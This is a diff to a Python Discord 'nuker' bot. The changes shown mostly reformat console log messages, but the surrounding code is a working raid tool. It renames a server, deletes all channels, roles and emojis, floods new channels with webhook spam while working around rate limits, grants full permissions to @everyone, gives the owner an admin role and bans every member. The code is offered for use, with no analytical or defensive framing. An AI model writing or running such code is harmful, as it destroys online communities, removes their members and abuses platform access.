@@ -7,6 +7,7 @@ import asyncio
 import os
 import itertools
 from discord import Permissions
+from discord.ext import commands
 from design.colors import *
 from design.banner import banner
 
@@ -71,13 +72,13 @@ async def nuke(ctx):
             guild = bot.get_guild(guild_id)
             
             if guild is None:
-                print(Fore.RED + '✗' + Style.RESET_ALL, f'Failed to find guild with ID {guild_id}')
+                print(Fore.RED + '[✗]' + Style.RESET_ALL, f'Failed to find guild with ID {guild_id}')
                 continue
         try:
                 await guild.edit(name=config['new_guild_name'])
                 with open(config['new_guild_icon'], 'rb') as f:
                     await guild.edit(icon=f.read())
-                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Changed guild name and icon in {guild.name}')
+                print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Changed guild name and icon in {guild.name}')
                 
                 deleted_channels = []
                 deleted_roles = []
@@ -94,40 +95,40 @@ async def nuke(ctx):
                 
                 await asyncio.gather(*tasks)
                 
-                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted text channels in {guild.name}: {deleted_channels}')
-                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted roles in {guild.name}: {deleted_roles}')
+                print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Deleted text channels in {guild.name}: {deleted_channels}')
+                print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Deleted roles in {guild.name}: {deleted_roles}')
                 
         except Exception as e:
-                print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in guild {guild.name}: {e}')
+                print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error in guild {guild.name}: {e}')
         
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, 'All actions completed')
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, 'All actions completed')
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in nuke command: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error in nuke command: {e}')
       
 
 async def delete_roles(guild, deleted_roles):
     try:
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleting roles in {guild.name}')
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Deleting roles in {guild.name}')
         for role in guild.roles:
             if role != guild.default_role:
                 await role.delete()
                 deleted_roles.append(role.name)
-                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted role: {role.name}')
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'All roles deleted in {guild.name}')
+                print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Deleted role: {role.name}')
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'All roles deleted in {guild.name}')
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error deleting roles in {guild.name}: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error deleting roles in {guild.name}: {e}')
 
 async def delete_channels(guild, deleted_channels):
     try:
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleting channels in {guild.name}')
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Deleting channels in {guild.name}')
         for channel in guild.channels:
             await channel.delete()
             if isinstance(channel, discord.TextChannel):
                 deleted_channels.append(channel.name)
-                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted channel: {channel.name}')
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'All channels deleted in {guild.name}')
+                print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Deleted channel: {channel.name}')
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'All channels deleted in {guild.name}')
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error deleting channels in {guild.name}: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error deleting channels in {guild.name}: {e}')
 
 async def spam_channels(guild, num_channels, deleted_channels):
     try:
@@ -139,16 +140,16 @@ async def spam_channels(guild, num_channels, deleted_channels):
             channel_name = random.choice(channel_names)
             channel = await guild.create_text_channel(name=channel_name)
             deleted_channels.append(channel.name)
-            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Spam text channel created in {guild.name}: {channel.name}')
+            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Spam text channel created in {guild.name}: {channel.name}')
 
             webhook = await channel.create_webhook(name=random.choice(webhook_names))
             webhook_list.append(webhook)
-            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Webhook created in {guild.name} - Channel: {channel.name}, Webhook: {webhook.name}')
+            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Webhook created in {guild.name} - Channel: {channel.name}, Webhook: {webhook.name}')
 
         await spam(webhook_list)  # Pass the webhook list to the spam function
 
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error creating spam text channels and webhooks in {guild.name}: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error creating spam text channels and webhooks in {guild.name}: {e}')
         
         
 async def spam(webhook_list):
@@ -160,7 +161,7 @@ async def spam(webhook_list):
         rest_time = config['rest_time']
         message_content = config['message_content']
 
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, "Spamming process started.")
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, "Spamming process started.")
 
         try:
             async with aiohttp.ClientSession() as session:
@@ -180,12 +181,12 @@ async def spam(webhook_list):
                                 break
                             except aiohttp.ClientResponseError as e:
                                 if e.status == 429:
-                                    print(Fore.RED + '✗' + Style.RESET_ALL, "Rate limited! Retrying...")
+                                    print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, "Rate limited! Retrying..")
                                     retry_after = int(e.headers.get('Retry-After', '1'))
                                     await asyncio.sleep(retry_after + 1)
-                                    print(Fore.GREEN + '✓' + Style.RESET_ALL, "Continuing spamming...")
+                                    print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, "Continuing spamming...")
                                 else:
-                                    print(Fore.RED + '✗' + Style.RESET_ALL, "Error sending webhook message:", e)
+                                    print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, "Error sending webhook message:", e)
                                     raise
 
                         await asyncio.sleep(rest_time)
@@ -194,10 +195,10 @@ async def spam(webhook_list):
                     await webhook.delete()
 
         except aiohttp.ClientError as e:
-            print(Fore.RED + '✗' + Style.RESET_ALL, f"Error sending webhook message: {e}")
+            print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f"Error sending webhook message: {e}")
 
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in spam command: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error in spam command: {e}')
         
       
 
@@ -208,9 +209,9 @@ async def spam_roles(guild, num_roles, deleted_roles):
             role_name = config['spam_roles_name']
             role = await guild.create_role(name=role_name)
             deleted_roles.append(role.name)
-            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Spam role created in {guild.name}: {role.name}')
+            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Spam role created in {guild.name}: {role.name}')
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error creating spam roles in {guild.name}: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error creating spam roles in {guild.name}: {e}')
 
 
 
@@ -223,10 +224,10 @@ async def adminall(ctx):
     permissions = discord.Permissions.all()
     try:
         await role.edit(permissions=permissions)
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'All permissions granted to @everyone')
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'All permissions granted to @everyone')
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'error granting permission to @everyone')
-
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'error granting permission to @everyone')
+    
 
 @bot.command(name="5")
 @is_owner()
@@ -235,9 +236,9 @@ async def emojidelete(ctx):
   for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
-      print(Fore.GREEN + '✓' + Style.RESET_ALL, f"successfully deleted emoji {emoji.name}!")
+      print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f"successfully deleted emoji {emoji.name}!")
     except Exception as e:
-      print(Fore.RED + '✗' + Style.RESET_ALL, f"error deleting emoji {emoji.name}!: {e}")
+      print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f"error deleting emoji {emoji.name}!: {e}")
             
 
 @bot.command(name="4")
@@ -249,19 +250,19 @@ async def getadmin(ctx):
         admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
         if admin_role is None:
             admin_role = await guild.create_role(name=ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
-            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Admin role created in {guild.name}')
+            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Admin role created in {guild.name}')
 
         owner = guild.get_member(OWNER_ID)
         await owner.add_roles(admin_role)
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Admin role given to bot owner in {guild.name}')
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Admin role given to bot owner in {guild.name}')
 
         try:
             await ctx.message.delete()
         except discord.NotFound:
-            print(Fore.RED + '✗' + Style.RESET_ALL, "Command message not found.")
+            print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, "Command message not found.")
 
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in admin command: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error in admin command: {e}')
         
        
 @bot.command(name="2")
@@ -280,11 +281,11 @@ async def banall(ctx):
                 continue
 
             await guild.ban(member)
-            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Banned member: {member.name}')
+            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Banned member: {member.name}')
 
-        print(Fore.GREEN + '✓' + Style.RESET_ALL, "Banning process completed.")
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, "Banning process completed.")
     except Exception as e:
-        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error banning people in {guild.name}: {e}')
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error banning people in {guild.name}: {e}')
 
 
 @bot.command()
